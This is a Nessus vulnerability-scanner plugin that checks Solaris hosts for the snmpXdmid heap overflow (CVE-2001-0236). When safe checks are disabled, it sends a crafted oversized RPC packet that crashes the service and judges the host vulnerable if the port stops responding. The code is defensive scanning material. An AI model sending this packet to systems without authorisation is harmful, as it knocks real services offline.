#
# This script is released under the GPL
#

# Changes by Tenable:
# - Revised plugin title, changed family, output formatting touch-ups (8/20/09)
# - Updated to use compat.inc, added CVSS score used extra instead of data arg in security_hole (11/20/2009)

include("compat.inc");

if(description)
{
 script_id(10659);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2001-0236");
 script_bugtraq_id(2417);
 script_xref(name:"OSVDB", value:"546");
 script_xref(name:"IAVA", value:"2001-a-0003");
 
 script_name(english:"Solaris snmpXdmid Long Indication Event Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a
heap overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote RPC service 100249 (snmpXdmid) is vulnerable
to a heap overflow which allows any user to obtain a root
shell on this host." );
 script_set_attribute(attribute:"solution", value:
"Disable this service (/etc/init.d/init.dmi stop) if you don't use
it, or contact Sun for a patch." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 script_summary(english:"heap overflow through snmpXdmid");
 script_category(ACT_MIXED_ATTACK); # mixed
 script_copyright(english:"This script is Copyright (C) 2001-2009 Intranode");
 script_family(english:"Gain a shell remotely");
 script_dependencies("rpc_portmap.nasl");
 script_require_keys("rpc/portmap");
 
 exit(0);
}

include("misc_func.inc");
include("global_settings.inc");


port = get_rpc_port(program:100249, protocol:IPPROTO_TCP);
if(port)
{
  if(safe_checks())
  {
   if ( report_paranoia < 2 ) exit(0);
 report = " 
The remote RPC service 100249 (snmpXdmid) may be vulnerable
to a heap overflow which allows any user to obtain a root
shell on this host.";

  security_hole(port:port, extra:report);
  exit(0);
  }
  
  
  if(get_port_state(port))
  {
   soc = open_sock_tcp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    req = raw_string(0x00, 0x00, 0x0F, 0x9C, 0x22, 0x7D,
	  	  0x93, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x02, 0x00, 0x01, 0x87, 0x99, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x00, 0x20, 0x3A, 0xF1, 
		  0x28, 0x90, 0x00, 0x00, 0x00, 0x09, 0x6C, 0x6F,
		  0x63, 0x61, 0x6C, 0x68, 0x6F, 0x73, 0x74, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x06, 0x44, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x00) +
		  crap(length:28000, data:raw_string(0x00));


     send(socket:soc, data:req);
     r = recv(socket:soc, length:4096);
     close(soc);
     sleep(1);
     soc2 = open_sock_tcp(port);
     if(!soc2)security_hole(port);
     else close(soc2);
   }
 }
}
